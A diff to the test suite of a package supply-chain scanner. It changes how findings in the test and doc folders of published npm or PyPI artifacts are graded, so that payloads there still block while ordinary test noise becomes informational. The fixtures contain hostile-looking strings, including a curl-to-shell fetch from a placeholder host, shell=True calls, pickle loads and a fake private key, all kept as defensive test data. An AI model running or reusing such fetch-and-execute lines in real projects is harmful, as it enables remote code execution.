@@ -1,10 +1,10 @@
-"""Test / doc / example dirs inside a published artifact are scanned.
+"""Test / doc / example dirs inside a published artifact are read for payloads.
 
 A tests/ dir in an npm tarball or a wheel is installed next to the runtime code, which
 can import it (`from evilpkg.tests import go`). The artifact scan used to skip every
-test / doc file, so a payload parked there read as zero findings. They are now graded
-the way the repo scan grades them (capability-style findings capped at medium, never
-blocking), except that payload-shaped findings keep their severity and block.
+test / doc file, so a payload parked there read as zero findings. Payload-shaped
+findings there now keep their severity and block; everything else is informational
+(no score, no review, no block) and those files do not count toward files_scanned.
 """
 from __future__ import annotations
 
@@ -47,6 +47,12 @@ def _non_blocking_only(findings):
                     if f.kind == "defect"))
 
 
+def _informational_only(findings):
+    """A test / doc file's non-payload findings: info defects only, no capabilities."""
+    return all(f.kind == "defect" and f.severity == "info" and not f.payload
+               for f in findings)
+
+
 # ── Recall: payloads in a test dir block ───────────────────────────────────────
 
 class TestPayloadInTestDirBlocks:
@@ -61,7 +67,7 @@ class TestPayloadInTestDirBlocks:
         assert blocking, findings
         assert all(f.file_path == "evilpkg/tests/__init__.py" for f in blocking)
         assert all(f.payload and finding_is_shipped(f) for f in blocking)
-        assert n == 2  # both files read
+        assert n == 1  # runtime files only: thin coverage measures runtime code
 
     def test_decode_exec_in_tests_dir(self):
         findings, _ = _artifact({
@@ -175,8 +181,8 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "def test_cli():\n"
                 "    subprocess.run(['pytest', '-q'], check=True)\n"),
         })
-        assert n == 1
-        assert _non_blocking_only(findings), findings
+        assert n == 0
+        assert _informational_only(findings), findings
 
     def test_tests_dir_shell_true_runner(self):
         findings, _ = _artifact({
@@ -185,7 +191,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "def test_build(tmp_path):\n"
                 "    subprocess.check_call('make -C ' + str(tmp_path), shell=True)\n"),
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_conftest_env_use(self):
         findings, _ = _artifact({
@@ -195,7 +201,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "os.environ['HOME'] = '/tmp/home'\n\n"
                 "@pytest.fixture\ndef token():\n    return os.getenv('SECRET_KEY')\n"),
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_fixture_with_fake_keys(self):
         findings, _ = _artifact({
@@ -206,7 +212,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm\n"
                 '-----END RSA PRIVATE KEY-----"""\n'),
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_inline_pickle_roundtrip_is_not_a_payload(self):
         """pandas' test_downstream: `python -OO -c "import pickle; …"` stays medium."""
@@ -216,7 +222,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "subprocess.check_call([sys.executable, '-OO', '-c', "
                 "'import pandas as pd, pickle; pickle.loads(pickle.dumps(pd.Series()))'])\n"),
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_builtins_namespace_lookup_is_not_a_payload(self):
         """numpy's test_api: `getattr(__builtins__, '__dict__', __builtins__)`."""
@@ -224,7 +230,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
             "evilpkg/tests/test_api.py":
                 "builtins = getattr(__builtins__, '__dict__', __builtins__)\n",
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_obfuscated_builtin_call_is_a_payload(self):
         findings, _ = _artifact({
@@ -238,7 +244,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
             "evilpkg/tests/fixtures/workflow.yml":
                 "steps:\n  - run: curl -s https://x.example.test/i | sh\n",
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_auth_post_in_a_test_is_not_exfil(self):
         findings, _ = _artifact({
@@ -247,7 +253,7 @@ class TestOrdinaryTestDirsStayNonBlocking:
                 "def test_login(server):\n"
                 "    requests.post(server.url, data={'password': 'hunter2'})\n"),
         })
-        assert _non_blocking_only(findings), findings
+        assert _informational_only(findings), findings
 
     def test_infra_file_keeps_plain_downgrade(self):
         """Payload exemption is for test / doc / example dirs only, not CI recipes."""
@@ -277,7 +283,7 @@ def test_runtime_file_findings_carry_no_payload_flag():
 
 # ── Coverage stays honest ──────────────────────────────────────────────────────
 
-def test_files_scanned_counts_test_files():
+def test_files_scanned_counts_runtime_files_only():
     result = ScanResult(repo="pypi:evilpkg", stars=0, description="", framework="")
     apply_artifact_scan(result, "pypi", _fetched({
         "evilpkg/__init__.py": "x = 1\n",
@@ -285,19 +291,42 @@ def test_files_scanned_counts_test_files():
         "evilpkg/tests/test_a.py": "def test_a():\n    assert True\n",
         "docs/conf.py": "project = 'x'\n",
     }))
-    # The empty file has no text to read; the other three are scanned.
-    assert result.files_scanned == 3
-    assert result.total_scannable_files == 3
+    # Test / doc files are read for payloads but thin coverage measures runtime code.
+    assert result.files_scanned == 1
+    assert result.total_scannable_files == 1
+    assert not result.sampled
+
+
+def test_test_suite_noise_does_not_move_the_score():
+    from src.scanner.scan import _calculate_trust_score
+
+    runtime = {f"evilpkg/m{i}.py": f"def f{i}():\n    return {i}\n" for i in range(10)}
+
+    def _score(files):
+        result = ScanResult(repo="pypi:evilpkg", stars=0, description="", framework="")
+        apply_artifact_scan(result, "pypi", _fetched(files))
+        return _calculate_trust_score(result), result.files_scanned
+
+    noisy = dict(runtime)
+    noisy["evilpkg/tests/test_build.py"] = (
+        "import subprocess, pickle\n"
+        "subprocess.check_call('make -C ' + str(1), shell=True)\n"
+        "pickle.load(open('x', 'rb'))\n")
+    noisy["evilpkg/tests/fixtures/keys.py"] = (
+        'PEM = """-----BEGIN RSA PRIVATE KEY-----\n'
+        "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n"
+        '-----END RSA PRIVATE KEY-----"""\n')
+    assert _score(noisy) == _score(runtime)
 
 
 @pytest.mark.parametrize("path,scannable", [
-    ("pkg/tests/test_a.py", True),
-    ("lib/__tests__/a.test.js", True),
-    ("docs/conf.py", True),
+    ("pkg/tests/test_a.py", False),
+    ("lib/__tests__/a.test.js", False),
+    ("docs/conf.py", False),
     ("pkg/tests/data/blob.bin", False),
     ("pkg/core.py", True),
 ])
-def test_member_class_counts_test_source_as_scannable(path, scannable):
+def test_member_class_partial_flag_tracks_runtime_source(path, scannable):
     assert _member_class(path)[1] is scannable
 
 
